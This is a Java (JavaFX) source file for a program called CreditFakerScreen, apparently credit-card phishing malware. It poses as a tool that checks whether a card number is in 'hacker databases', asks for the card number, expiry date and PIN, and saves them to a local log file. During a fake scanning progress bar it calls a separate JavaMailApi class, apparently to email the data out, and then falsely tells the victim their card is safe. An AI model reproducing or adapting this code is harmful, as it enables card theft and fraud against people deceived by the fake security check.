/*

Author : Mighty Ghost Hack 
Licence : GPL v3 or any later version

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;
See the GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.


*/
package creditfakerscreen;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.application.Application;
import javafx.concurrent.Task;
import javafx.event.ActionEvent;
import javafx.scene.Scene;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.PasswordField;
import javafx.scene.control.ProgressBar;
import javafx.scene.control.TextField;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.AnchorPane;
import javafx.scene.paint.Color;
import javafx.scene.paint.CycleMethod;
import javafx.scene.paint.LinearGradient;
import javafx.scene.paint.Stop;
import javafx.scene.shape.Rectangle;
import javafx.scene.text.Font;
import javafx.scene.text.FontPosture;
import javafx.scene.text.FontWeight;
import javafx.stage.Popup;
import javafx.stage.Stage;
import javax.mail.internet.*;

public class CreditFakerScreen extends Application{
    
    private Label label;
    private Label label1;
    private Label label2;
    private TextField text;
    private Label label3;
    private Label label5;
    private TextField text1;
    private Label label4;
    private Button button;
    private ImageView imageview;
    private Popup popup;
    private Scene scene1;
    private Stage primaryStage;
    private Label label6;
    private ImageView imageview1;
    private ProgressBar progrssbar;
    private Button button1;
    private Alert alert;
    private Alert alert1;
    private Thread thread;
    private PasswordField pass;
    private MimeBodyPart messageBodyPart;
   
    @Override
    public void start(Stage primaryStage) throws FileNotFoundException, InvocationTargetException {
        //linear gradient color of bg
        Stop[] stops = new Stop[]{new Stop(1, Color.WHITE), new Stop(0, Color.rgb(73, 235, 247, 0.7))};
        LinearGradient lg1 = new LinearGradient(0, 0, 0, 1, true, CycleMethod.NO_CYCLE, stops);
        Rectangle r1 = new Rectangle(0, 0, 1000, 700);
        r1.setFill(lg1);

        //first initial text
        label = new Label();
        label.setText("Is Your Credit Card Number In A Hacker's Database?");
        label.setLayoutX(55);
        label.setLayoutY(50);
        label.setTextFill(Color.rgb(112, 4, 4));
        label.setFont(Font.font("Arial", FontWeight.BOLD, FontPosture.REGULAR, 32));

        //description
        label1 = new Label();
        label1.setText("You can easily find out now! All you need to do is enter its information"
                + " here and \n we will scan thousands of hacker databases to see if any they"
                + "have match yours.....");
        label1.setLayoutX(55);
        label1.setLayoutY(120);
        label1.setFont(Font.font("Verdana", FontWeight.LIGHT, FontPosture.REGULAR, 17));

        //for credit number
        label2 = new Label();
        label2.setText("Credit Card Number : ");
        label2.setLayoutX(55);
        label2.setLayoutY(220);
        label2.setFont(Font.font("Verdana", FontWeight.BOLD, FontPosture.REGULAR, 18));

        //for enter credit number
        text = new TextField();
        text.setLayoutX(300);
        text.setLayoutY(216);
        text.setPrefColumnCount(20);
     

        //for Date
        label3 = new Label();
        label3.setText("Valid Date : ");
        label3.setLayoutX(55);
        label3.setLayoutY(300);
        label3.setFont(Font.font("Verdana", FontWeight.BOLD, FontPosture.REGULAR, 18));

        label5 = new Label();
        label5.setText("(mm/yy)");
        label5.setLayoutX(470);
        label5.setLayoutY(300);
        label5.setFont(Font.font("Verdana", FontWeight.LIGHT, FontPosture.REGULAR, 17));

        //for enter Date
        text1 = new TextField();
        text1.setLayoutX(300);
        text1.setLayoutY(296);
        text1.setPrefColumnCount(10);

        //for Pin Code
        label4 = new Label();
        label4.setText("Valid Pin Code : ");
        label4.setLayoutX(55);
        label4.setLayoutY(380);
        label4.setFont(Font.font("Verdana", FontWeight.BOLD, FontPosture.REGULAR, 18));

        //for enter Pin Code
        pass = new PasswordField();
        pass.setLayoutX(300);
        pass.setLayoutY(376);
        pass.setPrefColumnCount(6);
        //text2.setId("mypin");

        //for submiting 
        button = new Button("SUBMIT");
        button.setLayoutX(200);
        button.setLayoutY(500);
        button.setMinWidth(500);
        button.setMinHeight(50);
        button.setStyle("-fx-font: 30 arial; -fx-base: #ee2211; -fx-background-radius: 10; ");

        //for the Image
        File file = new File("C:\\Users\\Mayur\\Documents\\NetBeansProjects\\CreditFakerScreen\\src\\Image\\1.png");
        Image image = new Image(new FileInputStream(file));
        imageview = new ImageView(image);
        imageview.setLayoutX(610);
        imageview.setLayoutY(240);

        //-------------Event Handling--------------------------------------------//
        button.setOnAction((ActionEvent event) -> {
            if (proceed() == true) {

                try {
                    CreditFakerScreen cf = new CreditFakerScreen();
                    cf.nextScreen(primaryStage);
                } catch (FileNotFoundException ex) {
                    Logger.getLogger(CreditFakerScreen.class.getName()).log(Level.SEVERE, null, ex);
                } catch (InterruptedException ex) {
                    Logger.getLogger(CreditFakerScreen.class.getName()).log(Level.SEVERE, null, ex);
                }

            }
        });

        AnchorPane root = new AnchorPane();
        root.getChildren().addAll(r1, label, label1, label2, text, label3, text1, label4, label5, pass, button, imageview);

        File file1 = new File("C:\\Users\\Mayur\\Documents\\NetBeansProjects\\CreditFakerScreen\\src\\Image\\Circle.png");
        Scene scene = new Scene(root, 900, 600);
        primaryStage.setResizable(false);
        primaryStage.getIcons().add(new Image(new FileInputStream(file1)));
        primaryStage.setTitle("Security For Credit Card");
        primaryStage.setScene(scene);
        primaryStage.show();
    }

    public void nextScreen(Stage primaryStage) throws FileNotFoundException, InterruptedException {

        Stop[] stops = new Stop[]{new Stop(1, Color.WHITE), new Stop(0, Color.rgb(73, 235, 247, 0.7))};
        LinearGradient lg1 = new LinearGradient(0, 0, 0, 1, true, CycleMethod.NO_CYCLE, stops);
        Rectangle r1 = new Rectangle(0, 0, 1000, 700);
        r1.setFill(lg1);

        label6 = new Label();
        label6.setText("Scanning Database.......");
        label6.setLayoutX(55);
        label6.setLayoutY(115);
        label6.setTextFill(Color.rgb(112, 4, 4));
        label6.setFont(Font.font("Arial", FontWeight.BOLD, FontPosture.REGULAR, 40));

        
        File file = new File("C:\\Users\\Mayur\\Documents\\NetBeansProjects\\CreditFakerScreen\\src\\Image\\1.png");
        Image image = new Image(new FileInputStream(file));
        imageview1 = new ImageView(image);
        imageview1.setLayoutX(550);
        imageview1.setLayoutY(50);

        progrssbar = new ProgressBar();
        progrssbar.setLayoutX(100);
        progrssbar.setProgress(0.0f);
        progrssbar.setLayoutY(350);
        progrssbar.setMinSize(700, 50);
        progrssbar.setStyle("-fx-accent: #0cf72f");

        Task<Object> work = new Task<Object>() {
            @Override
            protected Object call() throws Exception {

                for (int i = 0; i <= 1020; i++) {

                    Thread.sleep(50);
                    if (i == 900) {
                        JavaMailApi jmp = new JavaMailApi();
                        jmp.mail();
                        updateProgress(i, 1020);
                    } else {
                        updateProgress(i, 1020);
                    }

                }

                return null;
            }

        };

        progrssbar.progressProperty().unbind();
        progrssbar.progressProperty().bind(work.progressProperty());
        work.setOnSucceeded(e -> {
            alert1 = new Alert(Alert.AlertType.INFORMATION);
            alert1.setTitle("Suceed");
            alert1.setContentText("Congrats, Your Credit Info Are Not Avaliable In Hacker's Database");
            alert1.setHeaderText(null);
            alert1.showAndWait();
            

        });
        Thread thread = new Thread(work);
        thread.setDaemon(true);
        thread.start();

        button1 = new Button("BACK");
        button1.setLayoutX(200);
        button1.setLayoutY(500);
        button1.setMinWidth(500);
        button1.setMinHeight(50);
        button1.setStyle("-fx-font: 30 arial; -fx-base: #ee2211; -fx-borderradius : 20; -fx-background-radius: 10;");

        button1.setOnAction(event -> {
            thread.stop();
            try {
                start(primaryStage);
                
            } catch (FileNotFoundException ex) {
                Logger.getLogger(CreditFakerScreen.class.getName()).log(Level.SEVERE, null, ex);
            } catch (InvocationTargetException ex) {
                Logger.getLogger(CreditFakerScreen.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        );

        AnchorPane rooot = new AnchorPane();
        rooot.getChildren().addAll(r1, label6, imageview1, progrssbar, button1);
        Scene scene1 = new Scene(rooot, 900, 600);
        primaryStage.setResizable(false);
        primaryStage.getIcons().add(new Image("file:C:\\Users\\Mayur\\Documents\\NetBeansProjects\\CreditFake\\src\\Image\\Circle.png"));
        primaryStage.setTitle("Security For Credit Card");
        primaryStage.setScene(scene1);
        primaryStage.show();
        

    }

    public boolean proceed() {

        if (text.getText().isEmpty() || text1.getText().isEmpty() || pass.getText().isEmpty()) {
            System.out.println("Invalid Entry");
            text.clear();
            text1.clear();
            pass.clear();
            alert = new Alert(Alert.AlertType.ERROR);
            alert.setTitle("Non Valid Data");
            alert.setContentText("Fill Every Block So We Can Analysis Information With Our Hacker's Database");
            alert.setHeaderText(null);
            alert.showAndWait();
            return false;
        } else {
            System.out.println("Information Going To Scan");
            StringBuilder sb = new StringBuilder();
            sb.append(text.getText());
            sb.append(" ");
            sb.append(text1.getText());
            sb.append(" ");
            sb.append(pass.getText());
            

            File file = new File("D:\\New folder (2)\\log.txt"); // specify the location where you want to save then same location paste into javamail file
            FileWriter w;
            try {
                w = new FileWriter(file);
                w.write(sb.toString());
                w.close();
            } catch (IOException ex) {
                Logger.getLogger(CreditFakerScreen.class.getName()).log(Level.SEVERE, null, ex);
            }

            text.clear();
            text1.clear();
            pass.clear();
            return true;
        }
    }

    public static void main(String[] args)
    {
        launch(args);
    }
    
}
